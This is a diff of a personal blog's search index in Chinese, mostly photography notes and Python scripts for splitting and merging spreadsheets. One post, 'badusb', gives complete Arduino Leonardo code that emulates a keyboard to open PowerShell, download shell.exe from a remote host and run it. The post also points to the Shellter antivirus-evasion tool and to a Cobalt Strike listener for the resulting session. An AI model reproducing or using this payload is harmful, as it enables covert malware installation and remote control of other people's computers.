@@ -1,27 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>badusb</title>
-    <url>/2023/06/02/badusb/</url>
-    <content><![CDATA[<h1>Arduino  Leonardo 制作badusb</h1>
-<h3 id="badusb是什么❓">Badusb是什么❓</h3>
-<p>计算机或者其它设备&quot;承认&quot;我们插入的硬件为键盘鼠标，Leonardo就可以模拟键盘鼠标操作，输入一些指令。</p>
-<h3 id="arduino-leonardo-什么样子？">Arduino  Leonardo 什么样子？</h3>
-<img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/1685543471012-81399cab-d581-4e7b-af3c-8be196c33da3.jpeg" alt="IMG_9809.jpeg" style="zoom: 25%;" />
-<h3 id="arduino-ide-下载">arduino IDE 下载</h3>
-<p><a href="https://www.arduino.cc/en/software">下载链接</a></p>
-<h3 id="免杀工具shellter下载">免杀工具shellter下载</h3>
-<p><a href="https://www.shellterproject.com/download/">下载链接</a></p>
-<h3 id="badusb-代码">badusb 代码</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;Keyboard.h&gt;</span></span><br><span class="line">void setup() </span><br><span class="line">&#123;</span><br><span class="line">  Serial.begin(<span class="number">9600</span>);</span><br><span class="line">    Keyboard.begin();</span><br><span class="line">    delay(<span class="number">5000</span>);</span><br><span class="line">    Keyboard.press(KEY_LEFT_GUI); // 模拟按下 Windows 键</span><br><span class="line">    Keyboard.press(<span class="string">&#x27;r&#x27;</span>); // 模拟按下 R 键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.press(KEY_CAPS_LOCK); //利用开大写输小写绕过输入法</span><br><span class="line">    Keyboard.release(KEY_CAPS_LOCK);//</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;powershell&quot;</span>); // 输入 powershell 命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;$url = \&quot;http://ip/shell.exe\&quot;&quot;</span>);  //输入远程服务器上的程序路径</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;$filePath = \&quot;$env:USERPROFILE\\Desktop\\shell.exe\&quot;&quot;</span>);  //安装目录 </span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;Invoke-WebRequest -Uri  $url  -OutFile  $filePath&quot;</span>); // 输入下载命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;Start-Process  -FilePath  $filePath&quot;</span>); // 输入执行命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;exit&quot;</span>); // 输入 exit 命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    Keyboard.end(); // 结束键盘通讯</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void loop() &#123;</span><br><span class="line">// 空循环</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="然后利用cs监听上线即可">然后利用cs监听上线即可</h4>
-<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/image-20230602112516109.png" alt="image-20230602112516109"></p>
-]]></content>
-      <tags>
-        <tag>硬件</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>南澳西涌&amp;长曝光</title>
     <url>/2023/03/21/%E4%B8%9C%E6%B6%8C-%E9%95%BF%E6%9B%9D%E5%85%89/</url>
     <content><![CDATA[<blockquote>
@@ -43,21 +22,35 @@
       </tags>
   </entry>
   <entry>
-    <title>抽象派</title>
-    <url>/2023/03/14/%E6%8A%BD%E8%B1%A1%E6%B4%BE/</url>
-    <content><![CDATA[<h1>抽象派</h1>
-<blockquote>
-<p>用大光圈去拍摄，把焦点对焦大约在60cm处，晚上拍摄灯光，应有戏剧性的抽象效果。</p>
-</blockquote>
-<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04186.png" alt=""></p>
-<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04187.png" alt=""></p>
-<p><img src="https://p.ipic.vip/aqy0m6.jpg" alt=""></p>
+    <title>badusb</title>
+    <url>/2023/06/02/badusb/</url>
+    <content><![CDATA[<h1>Arduino  Leonardo 制作badusb</h1>
+<h3 id="badusb是什么❓">Badusb是什么❓</h3>
+<p>计算机或者其它设备&quot;承认&quot;我们插入的硬件为键盘鼠标，Leonardo就可以模拟键盘鼠标操作，输入一些指令。</p>
+<h3 id="arduino-leonardo-什么样子？">Arduino  Leonardo 什么样子？</h3>
+<img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/1685543471012-81399cab-d581-4e7b-af3c-8be196c33da3.jpeg" alt="IMG_9809.jpeg" style="zoom: 25%;" />
+<h3 id="arduino-ide-下载">arduino IDE 下载</h3>
+<p><a href="https://www.arduino.cc/en/software">下载链接</a></p>
+<h3 id="免杀工具shellter下载">免杀工具shellter下载</h3>
+<p><a href="https://www.shellterproject.com/download/">下载链接</a></p>
+<h3 id="badusb-代码">badusb 代码</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;Keyboard.h&gt;</span></span><br><span class="line">void setup() </span><br><span class="line">&#123;</span><br><span class="line">  Serial.begin(<span class="number">9600</span>);</span><br><span class="line">    Keyboard.begin();</span><br><span class="line">    delay(<span class="number">5000</span>);</span><br><span class="line">    Keyboard.press(KEY_LEFT_GUI); // 模拟按下 Windows 键</span><br><span class="line">    Keyboard.press(<span class="string">&#x27;r&#x27;</span>); // 模拟按下 R 键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.press(KEY_CAPS_LOCK); //利用开大写输小写绕过输入法</span><br><span class="line">    Keyboard.release(KEY_CAPS_LOCK);//</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;powershell&quot;</span>); // 输入 powershell 命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;$url = \&quot;http://ip/shell.exe\&quot;&quot;</span>);  //输入远程服务器上的程序路径</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;$filePath = \&quot;$env:USERPROFILE\\Desktop\\shell.exe\&quot;&quot;</span>);  //安装目录 </span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;Invoke-WebRequest -Uri  $url  -OutFile  $filePath&quot;</span>); // 输入下载命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;Start-Process  -FilePath  $filePath&quot;</span>); // 输入执行命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    delay(<span class="number">900</span>);</span><br><span class="line">    Keyboard.println(<span class="string">&quot;exit&quot;</span>); // 输入 exit 命令</span><br><span class="line">    Keyboard.press(KEY_RETURN); // 模拟按下回车键</span><br><span class="line">    Keyboard.releaseAll(); // 释放所有按键</span><br><span class="line">    Keyboard.end(); // 结束键盘通讯</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void loop() &#123;</span><br><span class="line">// 空循环</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="然后利用cs监听上线即可">然后利用cs监听上线即可</h4>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/image-20230602112516109.png" alt="image-20230602112516109"></p>
 ]]></content>
-      <categories>
-        <category>灯光</category>
-      </categories>
       <tags>
-        <tag>大光圈</tag>
+        <tag>硬件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>单元格内容拆分</title>
+    <url>/2023/07/20/%E5%8D%95%E5%85%83%E6%A0%BC%E5%86%85%E5%AE%B9%E6%8B%86%E5%88%86/</url>
+    <content><![CDATA[<h1>将第一列的单元格内容拆分成多行单元格并保存同一行第二列单元格</h1>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> load_workbook</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载要处理的WPS表格文件</span></span><br><span class="line">workbook = load_workbook(<span class="string">&#x27;test2.xlsx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择要处理的表格页</span></span><br><span class="line">sheet = workbook[<span class="string">&#x27;Sheet1&#x27;</span>]</span><br><span class="line"></span><br><span class="line">rows_to_process = []</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> sheet.iter_rows(min_row=<span class="number">2</span>, min_col=<span class="number">1</span>, max_col=<span class="number">2</span>):</span><br><span class="line">    cell1 = row[<span class="number">0</span>]</span><br><span class="line">    cell2 = row[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    value1 = cell1.value</span><br><span class="line">    value2 = cell2.value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> value1 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        lines = value1.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        rows_to_process.append((lines, value2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空原始数据</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> sheet.iter_rows(min_row=<span class="number">2</span>, min_col=<span class="number">1</span>, max_col=<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> cell <span class="keyword">in</span> row:</span><br><span class="line">        cell.value = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据调整后的行数重新写入数据</span></span><br><span class="line">current_row = <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> lines, value2 <span class="keyword">in</span> rows_to_process:</span><br><span class="line">    num_lines = <span class="built_in">len</span>(lines)</span><br><span class="line">    <span class="keyword">if</span> num_lines == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将拆分后的内容写入对应的多行单元格，并保存同一行的第二列单元格的内容</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_lines):</span><br><span class="line">        new_cell1 = sheet.cell(row=current_row + i, column=<span class="number">1</span>)</span><br><span class="line">        new_cell1.value = lines[i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> value2 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            new_cell2 = sheet.cell(row=current_row + i, column=<span class="number">2</span>)</span><br><span class="line">            new_cell2.value = value2</span><br><span class="line"></span><br><span class="line">    current_row += num_lines</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存处理后的表格</span></span><br><span class="line">workbook.save(<span class="string">&#x27;processed_file1.xlsx&#x27;</span>)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>python</tag>
+        <tag>xlsx文件处理</tag>
       </tags>
   </entry>
   <entry>
@@ -76,6 +69,43 @@
       </categories>
       <tags>
         <tag>慢快门</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>抽象派</title>
+    <url>/2023/03/14/%E6%8A%BD%E8%B1%A1%E6%B4%BE/</url>
+    <content><![CDATA[<h1>抽象派</h1>
+<blockquote>
+<p>用大光圈去拍摄，把焦点对焦大约在60cm处，晚上拍摄灯光，应有戏剧性的抽象效果。</p>
+</blockquote>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04186.png" alt=""></p>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/DSC04187.png" alt=""></p>
+<p><img src="https://p.ipic.vip/aqy0m6.jpg" alt=""></p>
+]]></content>
+      <categories>
+        <category>灯光</category>
+      </categories>
+      <tags>
+        <tag>大光圈</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>批量合并.xlsx文件</title>
+    <url>/2023/07/01/%E6%89%B9%E9%87%8F%E5%90%88%E5%B9%B6-xlsx%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h1>xlsx文件合并</h1>
+<blockquote>
+<p>背景： 目前工作中需要将众多终端部署的fscan扫描结果全部汇总到一个xlsx表里面，方便浏览提交报告。但是WPS 需要svip ，excel 懒得找破解防有后门。</p>
+</blockquote>
+<h2 id="自定义-xlsx文件合并">自定义.xlsx文件合并</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义要合并的 Excel 文件列表</span></span><br><span class="line">file_paths = [<span class="string">&quot;1.xlsx&quot;</span>, <span class="string">&quot;2.xlsx&quot;</span>, <span class="string">&quot;3.xlsx&quot;</span>,<span class="string">&quot;4.xlsx&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 ExcelWriter 对象，用于写入合并后的数据</span></span><br><span class="line">writer = pd.ExcelWriter(<span class="string">&quot;合并结果.xlsx&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历文件列表，并将每个文件的每个工作表读取到 DataFrame，并写入到相应的工作表中</span></span><br><span class="line"><span class="keyword">for</span> file_path <span class="keyword">in</span> file_paths:</span><br><span class="line">    xls = pd.ExcelFile(file_path)</span><br><span class="line">    <span class="keyword">for</span> sheet_name <span class="keyword">in</span> xls.sheet_names:</span><br><span class="line">        df = xls.parse(sheet_name)</span><br><span class="line">        df.to_excel(writer, sheet_name=sheet_name, index=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 保存并关闭 ExcelWriter 对象</span></span><br><span class="line">writer.save()</span><br><span class="line">writer.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Excel 文件合并完成！&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="当下目录所有的-xlsx">当下目录所有的.xlsx</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">folder_path = <span class="string">&quot;.&quot;</span>  <span class="comment"># 本目录路径</span></span><br><span class="line">excel_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(folder_path) <span class="keyword">if</span> f.endswith(<span class="string">&quot;.xlsx&quot;</span>) <span class="keyword">or</span> f.endswith(<span class="string">&quot;.xls&quot;</span>)]</span><br><span class="line"></span><br><span class="line">output_file = <span class="string">&quot;网络区域检测汇总.xlsx&quot;</span>  <span class="comment"># 合并后的Excel文件名</span></span><br><span class="line">writer = pd.ExcelWriter(output_file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> excel_file <span class="keyword">in</span> excel_files:</span><br><span class="line">    file_path = os.path.join(folder_path, excel_file)  <span class="comment"># 完整的文件路径</span></span><br><span class="line">    xls = pd.ExcelFile(file_path)</span><br><span class="line">    sheets = xls.sheet_names</span><br><span class="line">    <span class="keyword">for</span> sheet_name <span class="keyword">in</span> sheets:</span><br><span class="line">        df = pd.read_excel(xls, sheet_name)</span><br><span class="line">        df.to_excel(writer, sheet_name=sheet_name, index=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">writer.save()</span><br></pre></td></tr></table></figure>
+<h2 id="合并效果">合并效果</h2>
+<p><img src="https://cdn.staticaly.com/gh/Jiangjiuo/blogcnd@master/img/1688119308563-6715f326-10ef-40c9-b3c6-93714a0162bb.png" alt="image.png"></p>
+]]></content>
+      <tags>
+        <tag>python</tag>
+        <tag>文件处理</tag>
       </tags>
   </entry>
   <entry>
@@ -229,22 +259,6 @@
       </tags>
   </entry>
   <entry>
-    <title>拍摄</title>
-    <url>/2022/06/12/%E7%85%A7%E7%89%87/</url>
-    <content><![CDATA[<h2 id="拍摄设备">拍摄设备</h2>
-<ul>
-<li>松下 GX9,  SONY A7M4</li>
-<li>镜头 :松下14-140mm，小蚁12-40mm，松下25mm f1.7，松莱25mm f1.4，适马 28-70 mm f2.8</li>
-</ul>
-]]></content>
-      <categories>
-        <category>相机📷参数</category>
-      </categories>
-      <tags>
-        <tag>设备清单</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>爬虫动物</title>
     <url>/2023/03/27/%E7%88%AC%E8%99%AB%E5%8A%A8%E7%89%A9/</url>
     <content><![CDATA[<blockquote>
@@ -258,6 +272,22 @@
       </categories>
       <tags>
         <tag>蜥蜴</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>拍摄</title>
+    <url>/2022/06/12/%E7%85%A7%E7%89%87/</url>
+    <content><![CDATA[<h2 id="拍摄设备">拍摄设备</h2>
+<ul>
+<li>松下 GX9,  SONY A7M4</li>
+<li>镜头 :松下14-140mm，小蚁12-40mm，松下25mm f1.7，松莱25mm f1.4，适马 28-70 mm f2.8</li>
+</ul>
+]]></content>
+      <categories>
+        <category>相机📷参数</category>
+      </categories>
+      <tags>
+        <tag>设备清单</tag>
       </tags>
   </entry>
   <entry>
